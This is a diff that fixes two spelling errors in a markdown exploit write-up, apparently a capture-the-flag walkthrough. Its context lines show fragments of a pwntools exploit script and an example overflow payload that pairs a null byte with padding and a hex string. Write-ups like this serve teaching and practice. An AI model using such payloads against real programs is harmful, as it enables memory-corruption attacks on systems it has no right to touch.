@@ -72,7 +72,7 @@ We use -1 at the end to represent the length of null byte.
 
 ### Exploit Code
 
-We can use Pwn Tools to write the exloit
+We can use Pwn Tools to write the exploit
 
 ```python
 from pwn import *
@@ -95,7 +95,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-Exmaple for a payload
+Example for a payload
 ```
 hello\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
 ```
